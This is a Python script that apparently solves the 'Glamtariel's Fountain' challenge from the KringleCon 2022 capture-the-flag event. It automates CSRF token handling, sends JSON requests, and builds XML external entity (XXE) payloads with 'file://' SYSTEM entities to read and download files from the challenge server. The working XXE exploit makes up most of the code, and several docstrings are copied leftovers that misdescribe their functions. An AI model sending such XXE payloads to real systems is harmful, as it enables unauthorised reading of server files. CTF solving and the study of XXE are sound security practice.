#!/usr/bin/env python
"""Check if KringleCon 2022 is live!"""
import time
import os
from datetime import datetime

import click
import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()
URL = "https://glamtarielsfountain.com/dropped"
TIMEOUT = 10
DELAY = 120
CSRF_TOKEN = None
SESSION = requests.Session()
LOOPS = 2

imgs = ["img1", "img2", "img3", "img4"]

files = [
    "/app/static/images/ringlist.txt",
    "/app/static/images/x_phial_pholder_2022/bluering.txt",
    "/app/static/images/x_phial_pholder_2022/redring.txt",
    "/app/static/images/x_phial_pholder_2022/silverring.txt",
    "/app/static/images/x_phial_pholder_2022/greenring.txt",
    "/app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt",
]

entities = ["princess", "fountain"]


def format_message(msg: str, msg_type: str) -> str:
    """Format and colorize a message."""
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%dT%H:%M:%S")
    message = f"{timestamp} - {msg}"

    msg_type_mapper = {
        "INFO": click.style(f"[-] {message}", fg="blue"),
        "SUCCESS": click.style(f"[+] {message}", fg="green"),
        "WARNING": click.style(f"[!] {message}", fg="yellow"),
        "ERROR": click.style(f"[E] {message}", fg="red"),
    }

    return msg_type_mapper.get(msg_type.upper(), message)


def get_csrf_token(response: requests.Response):
    """Update the value of the CSRF token."""
    global CSRF_TOKEN

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_id = soup.find("meta", {"id": "csrf"})

    if csrf_id and csrf_id.attrs.get("content", False):
        CSRF_TOKEN = csrf_id.attrs["content"]


def download_file(path: str):
    """Download a file"""
    filename = os.path.basename(path).split(",")[0]
    response = SESSION.get(
        f"https://glamtarielsfountain.com/{path}", headers={"X-Grinchum": CSRF_TOKEN}
    )

    with open(filename, "wb") as fhandle:
        fhandle.write(response.content)


def send_json_request(who: str, img: str):
    """Send out a Pushover notification."""
    response = SESSION.post(
        URL,
        timeout=TIMEOUT,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Grinchum": CSRF_TOKEN,
        },
        json={"imgDrop": img, "who": who, "reqType": "json"},
    )

    # print(response.headers)

    if response.status_code == 200:
        return response.json()
    else:
        return None


def send_xee_xml_request(file: str):
    """Send out a Pushover notification."""
    response = SESSION.post(
        URL,
        timeout=TIMEOUT,
        headers={
            "Content-Type": "application/xml",
            "Accept": "application/json",
            "X-Grinchum": CSRF_TOKEN,
        },
        data=(
            '<?xml version="1.0" encoding="UTF-8" ?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}" >]>'
            "<root>"
            "<imgDrop>&xxe;</imgDrop>"
            "<who>princess</who>"
            "<reqType>xml</reqType>"
            "</root>"
        ),
    )

    if response.status_code == 200:
        return response.json()
    else:
        return None


def send_xee2_xml_request(img: str):
    """Send out a Pushover notification."""
    response = SESSION.post(
        URL,
        timeout=TIMEOUT,
        headers={
            "Content-Type": "application/xml",
            "Accept": "application/json",
            "X-Grinchum": CSRF_TOKEN,
        },
        data=(
            '<?xml version="1.0" encoding="UTF-8" ?>'
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM "
            '"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>'
            "<root>"
            f"<imgDrop>{img}</imgDrop>"
            "<who>princess</who>"
            "<reqType>&xxe;</reqType>"
            "</root>"
        ),
    )

    if response.status_code == 200:
        return response.json()
    else:
        return None


def start():
    """Test."""
    # Initial request to get the CSRF token (aka, Ticket)
    response = SESSION.get(URL)
    get_csrf_token(response)

    # Ticket and cookie details
    click.echo(format_message(f"Ticket: {CSRF_TOKEN}", "success"))

    for cookie in response.cookies:
        click.echo(format_message(f"Cookie: {cookie}", "success"))

    # Send JSON requests to princess and fountain until we get the 4 rings
    click.echo(format_message("Sending JSON", "info"))

    for _ in range(LOOPS):
        for img in imgs:
            for entity in entities:
                json_response = send_json_request(entity, img)
                print(json_response)

                if json_response["visit"] != "none":
                    click.echo(
                        format_message(f"Visit: {json_response['visit']}", "warning")
                    )
                    download_file(json_response["visit"])

    # Switch over to XML requests to just the princess
    click.echo(format_message("Switching to XML", "info"))

    for file in files:
        xml_response = send_xee_xml_request(file)
        print(xml_response)

        if xml_response["visit"] != "none":
            click.echo(format_message(f"Visit: {xml_response['visit']}", "warning"))
            download_file(xml_response["visit"])

    # Final request to share the silver ring
    xml_response = send_xee2_xml_request("img1")
    print(xml_response)

    if xml_response["visit"] != "none":
        click.echo(format_message(f"Visit: {xml_response['visit']}", "warning"))
        download_file(xml_response["visit"])


if __name__ == "__main__":
    start()
